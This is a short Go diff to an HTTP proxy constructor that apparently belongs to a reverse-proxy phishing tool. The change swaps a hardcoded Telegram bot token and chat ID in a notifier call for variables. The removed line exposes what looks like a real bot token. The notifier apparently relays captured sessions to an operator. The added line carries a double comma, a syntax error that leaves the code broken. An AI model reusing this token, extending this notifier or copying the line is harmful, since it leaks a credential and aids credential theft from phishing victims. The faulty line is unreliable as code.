@@ -133,7 +133,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
-		telegram:          NewTelegramNotifier("7791547355:AAH3PgpwEnVIXqfHSrMtqD-s3aNst-RAVSc", "7059352737"),
+		telegram:          NewTelegramNotifier(telegramToken, telegramChat),,
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
